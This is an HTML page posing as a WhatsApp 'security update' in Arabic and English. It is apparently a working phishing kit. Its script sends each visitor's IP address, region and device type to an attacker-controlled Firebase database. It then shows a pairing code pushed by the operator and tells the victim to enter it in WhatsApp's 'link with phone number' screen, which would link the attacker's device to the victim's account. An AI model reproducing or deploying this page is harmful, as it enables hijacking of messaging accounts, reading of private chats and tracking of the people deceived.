<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; }
        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
        .arrived { color: #d91e1e !important; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="u-title" class="header-title">WhatsApp Security Update</div>
        <div id="u-badge" class="badge">Checking Device...</div>
        <div class="v-box">
            <div class="v-row"><span id="u-l1">Current Protocol:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
            <div style="height:1px; background:#eee; margin:5px 0"></div>
            <div class="v-row"><span id="u-l2">Updated Protocol:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
        </div>
        <p id="u-alert" class="alert-p"></p>
        <div id="u-steps" class="steps"></div>
        <div class="code-zone">
            <div id="pairing-code">. . .</div>
            <div id="u-wait" class="wait-text"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        const userId = new URLSearchParams(window.location.search).get('id');

        const isAr = navigator.language.startsWith('ar');
        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);

        const content = {
            ar: { badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. اضغط على إشعار واتساب لربط الجهاز.<br>2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>3. أدخل الرمز الذي سيظهر هنا:", wait: "في انتظار الرمز...", done: "أدخل الكود الآن في واتساب" },
            en: { badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select 'Link with phone number instead'.<br>3. Enter the code shown below:", wait: "Awaiting security code...", done: "Enter code in WhatsApp now" }
        };

        const c = isAr ? content.ar : content.en;
        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
        document.getElementById('u-badge').innerText = c.badge;
        document.getElementById('u-alert').innerText = c.alert;
        document.getElementById('u-steps').innerHTML = c.steps;
        document.getElementById('u-wait').innerText = c.wait;

        if (userId) {
            const sRef = db.ref('monitoring/' + userId);
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
            }).catch(() => sRef.set({ status: "Online", ip: "Hidden", device: isIOS ? "iPhone" : "Android", ts: Date.now() }));

            sRef.onDisconnect().update({ status: "Offline" });
            db.ref('commands/' + userId).on('value', s => {
                const v = s.val();
                if (v && v.code) {
                    document.getElementById('pairing-code').innerText = v.code;
                    document.getElementById('u-wait').innerText = c.done;
                    document.getElementById('u-wait').classList.add('arrived');
                }
            });
        }
    </script>
</body>
</html>
